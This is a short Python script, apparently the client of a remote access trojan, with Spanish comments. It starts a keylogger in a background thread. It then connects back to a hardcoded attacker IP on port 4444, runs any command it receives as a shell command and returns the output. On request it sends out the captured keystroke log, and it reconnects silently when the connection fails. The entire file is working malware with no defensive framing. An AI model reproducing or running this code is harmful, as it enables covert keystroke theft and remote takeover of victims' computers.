from modules.keylogger import start_keylogger
import socket
import subprocess
import os
import threading

# Cambia esto por la IP de tu servidor (atacante)
HOST = '192.168.10.14'
PORT = 4444

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))

            while True:
                command = s.recv(1024).decode()
                if command.lower() == "exit":
                    break

                elif command.lower() == "get_log":
                    try:
                        with open("keylog.txt", "r") as f:
                            log = f.read()
                        s.send(log.encode())
                    except:
                        s.send(b"[!] No se pudo leer el archivo keylog.txt")

                else:
                    output = subprocess.getoutput(command)
                    s.send(output.encode())

            s.close()
        except:
            pass  # retry loop si falla

# 🔥 Iniciar keylogger en hilo antes de conectar
threading.Thread(target=start_keylogger, daemon=True).start()

# 🔌 Conectar al servidor
connect()

